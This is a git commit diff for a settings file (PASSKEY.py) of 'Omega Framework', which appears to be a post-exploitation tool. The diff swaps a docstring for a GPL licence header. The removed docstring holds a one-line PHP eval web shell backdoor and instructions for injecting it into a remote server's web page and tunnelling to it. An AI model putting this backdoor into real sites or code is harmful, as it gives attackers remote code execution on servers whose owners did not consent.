1b74f56f5cda73b70fcc4c62500b5d3052625544
Ivan Nikolsky <54115104+enty8080@users.noreply.github.com>
2020-03-09 14:41:08 +0300

    Update PASSKEY.py

--- src/core/session/settings/PASSKEY.py
+++ src/core/session/settings/PASSKEY.py
@@ -1,28 +1,23 @@
-"""
-HTTP Header to use as main omega payload stager for RCE.
+#!/usr/bin/env python3
 
-PASSKEY is used by BACKDOOR setting, and omega's http
-tunnel mechanisms as the main payload stager & dispatcher.
+#            ---------------------------------------------------
+#                              Omega Framework                                
+#            ---------------------------------------------------
+#                  Copyright (C) <2020>  <Entynetproject>       
+#
+#        This program is free software: you can redistribute it and/or modify
+#        it under the terms of the GNU General Public License as published by
+#        the Free Software Foundation, either version 3 of the License, or
+#        any later version.
+#
+#        This program is distributed in the hope that it will be useful,
+#        but WITHOUT ANY WARRANTY; without even the implied warranty of
+#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+#        GNU General Public License for more details.
+#
+#        You should have received a copy of the GNU General Public License
+#        along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
-While exploiting a remote TARGET with omega, make sure
-PASSKEY have the same value as the one it had when backdoor
-had been generated.
-
-* AUTHENTICATION FEATURE:
-It is recommended that you permanently change PASSKEY value
-to a custom value for authentication purposes.
-Indeed, having a custom PASSKEY value ensures that other
-omega users will not be able to connect to your installed
-backdoor without the knowledge of it's value.
-
-* EXAMPLE: Use a custom PASSKEY to prevent unauthorized access
-> set PASSKEY Custom123
-> exploit
-# [*] Current backdoor is: <?php @eval($_SERVER['HTTP_CUSTOM123']); ?>
-# To run a remote tunnel, the backdoor shown above must be
-# manually injected in a remote server executable web page.
-# Then, use `set TARGET <BACKDOORED_URL>` and run `exploit`.
-"""
 import re
 
 import linebuf
